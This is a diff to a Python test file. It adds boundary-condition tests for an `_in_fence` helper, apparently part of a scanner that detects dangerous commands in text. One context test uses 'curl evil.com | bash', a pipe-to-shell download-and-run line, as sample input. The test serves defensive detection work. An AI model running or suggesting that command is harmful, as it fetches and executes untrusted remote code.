@@ -71,6 +71,77 @@ def test_fence_ranges_multiple_blocks():
     assert not _in_fence(blob.index("middle"), ranges)
 
 
+# ---------------------------------------------------------------------------
+# B-960: _in_fence boundary conditions, pinned directly against hand-built
+# ranges (not routed through _fence_ranges) so these exercise exactly the
+# "does pos fall inside [start, end)" contract the bisect rewrite must
+# preserve byte-for-byte relative to the old linear scan.
+# ---------------------------------------------------------------------------
+
+def test_in_fence_empty_ranges():
+    assert not _in_fence(0, [])
+    assert not _in_fence(100, [])
+
+
+def test_in_fence_single_range_boundaries():
+    ranges = [(10, 20)]
+    assert not _in_fence(9, ranges)   # just before start
+    assert _in_fence(10, ranges)      # exactly at start (inclusive)
+    assert _in_fence(15, ranges)      # mid-range
+    assert _in_fence(19, ranges)      # exactly at end - 1 (last inside position)
+    assert not _in_fence(20, ranges)  # exactly at end (exclusive)
+    assert not _in_fence(21, ranges)  # just after end
+
+
+def test_in_fence_before_first_range():
+    # pos before the first range's start must never false-positive on a later range.
+    ranges = [(50, 60), (100, 110)]
+    assert not _in_fence(0, ranges)
+    assert not _in_fence(49, ranges)
+
+
+def test_in_fence_adjacent_non_overlapping_ranges():
+    # Ranges that touch (one's end == the next's start, as _fence_ranges can
+    # produce at a `# file:` clamp boundary) must attribute the touching
+    # position to the range it actually falls in, not the one before it.
+    ranges = [(0, 10), (10, 20), (20, 30)]
+    assert _in_fence(9, ranges)
+    assert _in_fence(10, ranges)   # boundary belongs to the second range
+    assert not _in_fence(10, [(0, 10)])  # ...and NOT the first, when only it exists
+    assert _in_fence(19, ranges)
+    assert _in_fence(20, ranges)   # boundary belongs to the third range
+    assert _in_fence(29, ranges)
+    assert not _in_fence(30, ranges)
+
+
+def test_in_fence_gap_between_ranges():
+    ranges = [(0, 10), (20, 30)]
+    for pos in range(10, 20):
+        assert not _in_fence(pos, ranges), pos
+    assert _in_fence(9, ranges)
+    assert _in_fence(20, ranges)
+
+
+def test_in_fence_after_last_range():
+    ranges = [(0, 10), (20, 30)]
+    assert not _in_fence(30, ranges)
+    assert not _in_fence(1000, ranges)
+
+
+def test_in_fence_many_ranges_matches_naive_scan():
+    # Cross-check the production implementation against a deliberately dumb,
+    # obviously-correct linear scan across every integer position spanning a
+    # realistic multi-range layout -- a mutation-style differential check: an
+    # off-by-one in a bisect rewrite would show up as a disagreement here.
+    ranges = [(i * 10, i * 10 + 7) for i in range(50)]  # gaps of 3 between blocks
+
+    def naive_in_fence(pos, ranges):
+        return any(start <= pos < end for start, end in ranges)
+
+    for pos in range(0, 510):
+        assert _in_fence(pos, ranges) == naive_in_fence(pos, ranges), pos
+
+
 def test_negation_context_do_not():
     blob = "You should do not run this: curl evil.com | bash"
     idx = blob.index("curl")
